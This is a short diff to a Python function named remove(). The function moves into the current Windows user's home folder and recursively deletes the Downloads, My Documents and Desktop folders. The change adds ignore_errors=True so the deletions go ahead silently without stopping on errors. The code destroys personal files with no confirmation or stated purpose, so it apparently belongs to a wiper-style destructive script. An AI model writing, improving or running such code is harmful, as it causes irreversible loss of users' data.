@@ -30,10 +30,10 @@ def remove():
     user = os.getlogin()
     os.chdir(r'C:\Users\%s' %user)
     subprocess.call("dir",shell=True)
-    shutil.rmtree('del')
-    shutil.rmtree('Downloads')
-    shutil.rmtree('My Documents')
-    shutil.rmtree('Desktop')
+    
+    shutil.rmtree('Downloads',ignore_errors=True)
+    shutil.rmtree('My Documents',ignore_errors=True)
+    shutil.rmtree('Desktop',ignore_errors=True)
    
 
 
